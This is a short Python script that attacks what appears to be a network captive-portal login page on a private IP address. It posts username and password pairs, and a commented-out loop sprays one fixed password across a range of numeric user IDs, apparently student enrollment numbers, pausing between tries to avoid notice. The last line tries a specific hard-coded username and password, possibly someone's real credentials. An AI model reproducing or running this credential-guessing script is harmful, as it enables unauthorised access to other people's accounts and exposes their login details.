import requests, time

url = "http://172.16.68.6:8090/login.xml"

def login(user, passwd):
    req = {'mode': '191', 'username': user, 'password': passwd}
    x = requests.post(url, data=req)
    if x.text[90] == 'Y':
        return f'[+] SUCESS User = {user}, Pass = {passwd}'
    else:
        return '[-] Failure :('

def logout(user):
    req = {'mode': '193', 'username': user}
    x = requests.post(url, data=req)

# for en in range(21103000, 21103100):
#     print(login(en, "357043AR"))
#     time.sleep(2)
#     logout(en)
#     time.sleep(5)

login('21103085','179001AS')
